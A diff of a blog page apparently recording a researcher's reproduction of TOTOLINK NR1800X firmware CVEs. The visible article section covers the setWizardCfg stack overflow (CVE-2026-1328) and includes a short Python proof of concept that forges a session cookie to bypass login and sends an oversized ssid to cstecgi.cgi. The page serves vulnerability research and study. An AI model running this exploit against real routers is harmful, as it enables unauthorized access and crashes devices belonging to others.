@@ -4,25 +4,37 @@
   <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
   <meta name="author" content="Misaki" />
-  <!-- Open Graph Description 简短摘要-->
   
-  <!-- 用于搜索引擎的文章摘要 -->
-  
-  <!-- 文章页 -->
   <meta name="description" content="记录 TOTOLINK 固件 CVE-2026-1326、CVE-2026-1327、CVE-2026-1328 的 QEMU 模拟、登录绕过、cstecgi.cgi 分析、命令注入和栈溢出复现。" />
   
+  <link rel="canonical" href="https://misaki.wiki/3b855173.html">
+  <meta property="og:site_name" content="Misaki" />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="CVE-2026-1328 TOTOLINK 登录绕过、命令注入与栈溢出复现 | Misaki" />
+  
+  <meta property="og:description" content="记录 TOTOLINK 固件 CVE-2026-1326、CVE-2026-1327、CVE-2026-1328 的 QEMU 模拟、登录绕过、cstecgi.cgi 分析、命令注入和栈溢出复现。" />
+  
+  <meta property="og:url" content="https://misaki.wiki/3b855173.html" />
+  
+  <meta property="og:image" content="https://misaki.wiki/img/misaki.jpg" />
+  
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="CVE-2026-1328 TOTOLINK 登录绕过、命令注入与栈溢出复现 | Misaki" />
+  
+  <meta name="twitter:description" content="记录 TOTOLINK 固件 CVE-2026-1326、CVE-2026-1327、CVE-2026-1328 的 QEMU 模拟、登录绕过、cstecgi.cgi 分析、命令注入和栈溢出复现。" />
+  
+  
+  <meta name="twitter:image" content="https://misaki.wiki/img/misaki.jpg" />
   
   
   <title>
-    
-      CVE-2026-1328 TOTOLINK 登录绕过、命令注入与栈溢出复现 
-      
-      
-      |
-    
-     Misaki
+    CVE-2026-1328 TOTOLINK 登录绕过、命令注入与栈溢出复现 | Misaki
   </title>
+  
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2026-1328 TOTOLINK 登录绕过、命令注入与栈溢出复现","description":"记录 TOTOLINK 固件 CVE-2026-1326、CVE-2026-1327、CVE-2026-1328 的 QEMU 模拟、登录绕过、cstecgi.cgi 分析、命令注入和栈溢出复现。","url":"https://misaki.wiki/3b855173.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://misaki.wiki/3b855173.html"},"datePublished":"2026-04-02T10:45:00.000Z","dateModified":"2026-06-16T07:55:51.778Z","author":{"@type":"Person","name":"Misaki"},"publisher":{"@type":"Organization","name":"Misaki"},"image":["https://misaki.wiki/img/misaki.jpg"],"articleSection":"CVE","keywords":"pwn, CVE, IoT, firmware, stack-overflow, QEMU, command-injection, TOTOLINK"}</script>
+  
 
   
     <link rel="apple-touch-icon" href="/img/favicon.ico">
@@ -96,6 +108,14 @@
           <a href="/archives/">文章</a>
         </li>
       
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
         <li class="nav-item" data-path="/friends/">
           <a href="/friends/">友链</a>
         </li>
@@ -116,21 +136,6 @@
       <div class="flex-container">
         <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
 <!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
-
-
-  <!-- LaTex Display -->
-
-  
-    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
-  
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [['$', '$'], ['\\(', '\\)']]
-      }
-    }
-  </script>
-
 
 
 
@@ -159,13 +164,77 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">CVE-2026-1328 TOTOLINK 登录绕过、命令注入与栈溢出复现</div>
+      <h1 class="post-title">CVE-2026-1328 TOTOLINK 登录绕过、命令注入与栈溢出复现</h1>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-          2026-06-13 19:12:42
+          2026-06-16 15:55:51
         </span>
         
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/CVE/" title="CVE">
+                    <b>#</b> CVE
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/pwn/" title="pwn">
+                    #pwn
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/CVE/" title="CVE">
+                    #CVE
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/IoT/" title="IoT">
+                    #IoT
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/firmware/" title="firmware">
+                    #firmware
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/stack-overflow/" title="stack-overflow">
+                    #stack-overflow
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/QEMU/" title="QEMU">
+                    #QEMU
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/command-injection/" title="command-injection">
+                    #command-injection
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/TOTOLINK/" title="TOTOLINK">
+                    #TOTOLINK
+                  </a>
+                </span>
+                
+              </span>
+          
       </div>
       <div class="markdown-body">
         <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>[[CVE]]<br><a href="%5Bhttps://www.totolink.net/home/menu/detail/menu_listtpl/download/id/225/ids/36.html%5D(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/225/ids/36.html)">固件下载</a><br>Ubuntu25.10<br>IDA9.1<br>binwalk<br>qemu<br>firmwalker</p>
@@ -218,6 +287,7 @@
 
 <h3 id="CVE-2026-1328栈溢出"><a href="#CVE-2026-1328栈溢出" class="headerlink" title="CVE-2026-1328栈溢出"></a>CVE-2026-1328栈溢出</h3><p>漏洞描述<br>NR1800 X_Firmware V9.1.0u.6279B20210910在setWizardCfg函数中存在缓冲区溢出漏洞。v49变量从POST请求中接收ssid参数。然而，由于用户可以控制ssID的输入，语句urldecode可能导致缓冲区溢出漏洞。<br>当 <code>topicurl</code> 为 <code>&quot;setWizardCfg&quot;</code> 时，调用函数 <code>sub_428C84</code><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260403151728127.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260403151839066.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260403151930589.png" alt="image.png"><br><code>websGetVar</code> 获取用户通过 POST 请求发送的 <code>ssid</code> 变量,保存到 <code>v49</code><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260403152044205.png" alt="image.png"><br><code>v49</code>有带入 <code>urldecode</code> 函数<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260403152008576.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260403152228250.png" alt="image.png"><br>且 <code>strlen(a1)</code> 是传入的 <code>v49</code>，但后续向<code>v3(v77)</code>输入数据没有检查 <code>v4</code> 是否超过了 <code>v77</code> 128 字节上限,从而溢出</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">TARGET_IP = <span class="string">&quot;192.168.10.200&quot;</span></span><br><span class="line">CGI_URL = <span class="string">f&quot;http://<span class="subst">&#123;TARGET_IP&#125;</span>/cgi-bin/cstecgi.cgi&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">f&quot;http://<span class="subst">&#123;TARGET_IP&#125;</span>/formLoginAuth.htm?authCode=1&amp;action=login&quot;</span></span><br><span class="line">r = requests.get(url, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">ts = re.search(<span class="string">r&quot;timestamp=(\d+)&quot;</span>, r.headers.get(<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;timestamp=0&quot;</span>))</span><br><span class="line">cookies = &#123;<span class="string">&quot;SESSION_ID&quot;</span>: <span class="string">f&quot;2:<span class="subst">&#123;ts.group(<span class="number">1</span>)&#125;</span>:2&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">requests.post(CGI_URL, json=&#123;</span><br><span class="line">    <span class="string">&quot;topicurl&quot;</span>: <span class="string">&quot;setWizardCfg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid&quot;</span>: <span class="string">&quot;a&quot;</span> * <span class="number">0x1000</span></span><br><span class="line">&#125;, cookies=cookies, timeout=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
       </div>
       
         <div class="prev-or-next">
@@ -232,9 +302,73 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-              2026-06-13 19:12:42
+              2026-06-16 15:55:51
             </span>
             
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/CVE/" title="CVE">
+                        <b>#</b> CVE
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/pwn/" title="pwn">
+                        #pwn
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/CVE/" title="CVE">
+                        #CVE
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/IoT/" title="IoT">
+                        #IoT
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/firmware/" title="firmware">
+                        #firmware
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/stack-overflow/" title="stack-overflow">
+                        #stack-overflow
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/QEMU/" title="QEMU">
+                        #QEMU
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/command-injection/" title="command-injection">
+                        #command-injection
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/TOTOLINK/" title="TOTOLINK">
+                        #TOTOLINK
+                      </a>
+                    </span>
+                    
+                  </span>
+              
           </div>
           <div class="post-foot-prev">
             
